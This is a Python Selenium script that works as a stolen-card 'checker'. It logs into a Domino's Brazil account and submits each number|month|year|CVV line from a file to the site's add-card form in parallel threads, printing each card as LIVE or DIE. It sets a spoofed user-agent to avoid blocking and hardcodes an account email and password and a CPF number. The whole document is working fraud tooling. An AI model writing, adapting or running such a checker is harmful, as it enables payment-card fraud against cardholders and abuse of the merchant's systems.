import os
import time
import concurrent.futures
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

# Configurações de Threads
MAX_WORKERS = 5

def get_driver():
    """Cria e retorna uma instância do Chrome otimizada para velocidade."""
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--blink-settings=imagesEnabled=false") # Bloqueia imagens
    options.add_argument("--log-level=3")
    options.add_argument("--window-size=1920,1080")
    
    # Adicionar User-Agent comum para evitar alguns bloqueios simples
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    
    driver = webdriver.Chrome(options=options)
    driver.set_page_load_timeout(30)
    return driver

def check_card(email, password, card_line):
    """Realiza o fluxo completo de verificação para um único cartão."""
    card_line = card_line.strip()
    if not card_line:
        return
    
    partes = card_line.split("|")
    if len(partes) != 4:
        print(f"[ERRO] Linha mal formatada: {card_line}")
        return
    
    numero, mes, ano, cvv = partes
    data_validade = f"{mes}{ano[-2:]}" if len(ano) == 4 else f"{mes}{ano}"
    
    driver = get_driver()
    wait = WebDriverWait(driver, 15)
    
    try:
        # 1. Login
        driver.get("https://www.dominos.com.br/login")
        
        btn_login_senha = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//*[contains(text(), 'Login com senha')] | //ion-button[contains(., 'Login com senha')]")
        ))
        driver.execute_script("arguments[0].click();", btn_login_senha)
        
        # Esperar inputs ficarem visíveis e preencher
        input_email = wait.until(EC.visibility_of_element_located((By.ID, "ion-input-0")))
        input_email.send_keys(email)
        
        input_senha = wait.until(EC.visibility_of_element_located((By.ID, "ion-input-1")))
        input_senha.send_keys(password)
        
        btn_entrar = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//*[contains(text(), 'Entrar')] | //ion-button[contains(., 'Entrar')]")
        ))
        driver.execute_script("arguments[0].click();", btn_entrar)
        
        # 2. Navegar para cartões
        # Tenta aguardar redirecionamento ou força a URL se demorar
        try:
            wait.until(EC.url_contains("my-cards"))
        except:
            driver.get("https://www.dominos.com.br/my-cards")
        
        # 3. Adicionar Cartão
        btn_add_cartao = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//*[contains(translate(text(), 'ADICIONAR NOVO CARTÃO', 'adicionar novo cartão'), 'adicionar novo cartão')] | //ion-button[contains(translate(., 'ADICIONAR NOVO CARTÃO', 'adicionar novo cartão'), 'adicionar novo cartão')]")
        ))
        driver.execute_script("arguments[0].click();", btn_add_cartao)
        
        # 4. Preencher Formulário
        # Apelido e Nome
        ion_apelido = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='name']")))
        ActionChains(driver).move_to_element(ion_apelido).click().send_keys("Afonso Claudio").perform()
        
        ion_titular = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='holderName']")))
        ActionChains(driver).move_to_element(ion_titular).click().send_keys("Afonso Claudio").perform()
        
        ion_cpf = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='cpf']")))
        ActionChains(driver).move_to_element(ion_cpf).click().send_keys("84830336072").perform()
        
        # Iframes sensíveis
        for i_title, i_id, i_val in [
            ("Iframe para número do cartão", "encryptedCardNumber", numero),
            ("Iframe para data de validade", "encryptedExpiryDate", data_validade),
            ("Iframe para código de segurança", "encryptedSecurityCode", cvv)
        ]:
            try:
                iframe = wait.until(EC.presence_of_element_located((By.XPATH, f"//iframe[@title='{i_title}']")))
                driver.switch_to.frame(iframe)
                input_field = wait.until(EC.presence_of_element_located((By.ID, i_id)))
                input_field.send_keys(i_val)
            finally:
                driver.switch_to.default_content()
        
        # 5. Salvar e Verificar
        btn_salvar = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//*[translate(text(), 'SALVR', 'salvr')='salvar'] | //ion-button[contains(translate(., 'SALVR', 'salvr'), 'salvar')]")
        ))
        driver.execute_script("arguments[0].click();", btn_salvar)
        
        # Verificação reativa (máximo 8 segundos de espera inteligente)
        start_check = time.time()
        while time.time() - start_check < 8:
            try:
                # Se o input "CPF do titular" não existir mais ou não estiver visível, deu LIVE
                cpf_elements = driver.find_elements(By.XPATH, "//input[@placeholder='CPF do titular']")
                if not cpf_elements or not cpf_elements[0].is_displayed():
                    print(f"[LIVE] {numero}")
                    return True
                
                # Se aparecer alguma mensagem de erro capturável (opcional expandir aqui)
            except:
                pass
            time.sleep(1)
            
        # Se saiu do loop e o campo ainda está lá, é DIE
        print(f"[DIE] {numero}")
        return False

    except Exception as e:
        print(f"[DIE] {numero}") # Consideramos erro como DIE na lógica original
        # print(f"DEBUG Erro ({numero}): {e}") # Descomente para depurar
        return False
    finally:
        driver.quit()

def main():
    MEU_EMAIL = "p808409@gmail.com"
    MINHA_SENHA = "@P808409p10"
    ARQUIVO_CARDS = "card.txt"
    
    if not os.path.exists(ARQUIVO_CARDS):
        print(f"Erro: Arquivo '{ARQUIVO_CARDS}' não encontrado!")
        return

    with open(ARQUIVO_CARDS, "r") as f:
        linhas = [l.strip() for l in f.readlines() if l.strip()]

    if not linhas:
        print("Arquivo de cartões vazio.")
        return

    print(f"--- Iniciando Verificação Otimizada ({len(linhas)} cartões, {MAX_WORKERS} threads) ---")
    start_total = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Passa email e senha para cada tarefa
        executor.map(lambda l: check_card(MEU_EMAIL, MINHA_SENHA, l), linhas)

    end_total = time.time()
    print(f"\n--- Finalizado em {end_total - start_total:.2f} segundos ---")

if __name__ == "__main__":
    main()

